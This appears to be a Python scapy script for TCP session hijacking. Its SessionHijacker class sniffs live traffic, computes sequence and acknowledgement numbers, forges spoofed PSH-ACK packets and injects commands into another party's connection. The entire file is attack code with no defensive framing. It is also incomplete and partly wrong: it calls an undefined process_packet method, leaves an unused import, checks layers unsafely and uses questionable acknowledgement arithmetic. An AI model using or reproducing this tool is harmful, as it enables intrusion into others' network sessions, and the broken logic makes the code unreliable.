from scapy.all import IP, TCP, send, sniff, Raw, srp
import threading

class SessionHijacker:
    def prepare_packet(self, packet, command, isServer):
        sequence = self.calculate_sequence_number(packet, isServer)
        acknowledgement = self.calculate_acknowledgement_number(packet, isServer)
        command = command + '\r\n'

        if isServer:
            return IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags='PA', seq=sequence, ack=acknowledgement) / command
        else:
            return IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(dport=packet[TCP].dport, sport=packet[TCP].sport, flags='PA', seq=sequence, ack=acknowledgement) / command
        
    def calculate_sequence_number(self, packet, isServer):
        if isServer:
            return packet[TCP].ack
        else:
            return packet[TCP].seq + (len(packet[Raw]) if packet.haslayer(Raw) else 0)
        
    def calculate_acknowledgement_number(self, packet, isServer):
        if isServer:
            return packet[TCP].seq + (len(packet[Raw]) if packet.haslayer(Raw) else 0)
        else:
            return packet[TCP].ack + (len(packet[Raw]) if packet.haslayer(Raw) else 0)

    def inject_command(self, packet, command, isServer):        
        server_thread = threading.Thread(target=self.sniff_and_send, args=(packet, command, isServer))        
        server_thread.start()

    def sniff_and_send(self, packet, command, isServer):
        prepared_packet = self.prepare_packet(packet, command, isServer)
        send(prepared_packet)

    def sniff_server_packets(self):
        return sniff(lfilter=lambda p: p.haslayer(TCP) and p[TCP].flags == 'PA' and len(p[Raw]) > 0, prn=self.process_packet, store=0)

